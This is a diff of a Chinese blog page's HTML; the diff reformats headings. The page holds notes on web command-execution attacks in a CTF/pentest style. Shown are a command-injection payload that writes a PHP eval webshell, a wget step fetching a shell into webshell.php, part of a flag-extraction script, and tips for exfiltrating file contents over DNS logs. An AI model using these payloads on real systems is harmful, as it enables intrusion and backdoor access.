@@ -628,8 +628,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>#代码命令执行函数</p>
-<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><table>
+                <h1 id="代码命令执行函数"><a href="#代码命令执行函数" class="headerlink" title="代码命令执行函数"></a>代码命令执行函数</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><table>
 <thead>
 <tr>
 <th>函数</th>
@@ -798,15 +797,11 @@ flag<span class="token operator">=</span> <span class="token string">""</span>
             flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>###写入webshell</p>
-<p>####直接写入</p>
-<pre class="line-numbers language-none"><code class="language-none">?cmd = echo "&lt;?php @eval(\$_POST[h3]);?&gt;"&gt;webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><h4 id="直接写入"><a href="#直接写入" class="headerlink" title="直接写入"></a>直接写入</h4><pre class="line-numbers language-none"><code class="language-none">?cmd = echo "&lt;?php @eval(\$_POST[h3]);?&gt;"&gt;webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>####外部下载</p>
-<pre class="line-numbers language-none"><code class="language-none">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="外部下载"><a href="#外部下载" class="headerlink" title="外部下载"></a>外部下载</h4><pre class="line-numbers language-none"><code class="language-none">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>####Dnslog</p>
-<p>1.命令执行时要避免空格，空格会导致空格后面的命令执行不到；</p>
+<h4 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h4><p>1.命令执行时要避免空格，空格会导致空格后面的命令执行不到；</p>
 <p>2.将读取的文件命令用反引号``包括起来；</p>
 <p>3.拼劲的域名又长度限制</p>
 <p>用<code>&lt;</code>替换读取文件中的空格，且对输出结果base64编码</p>
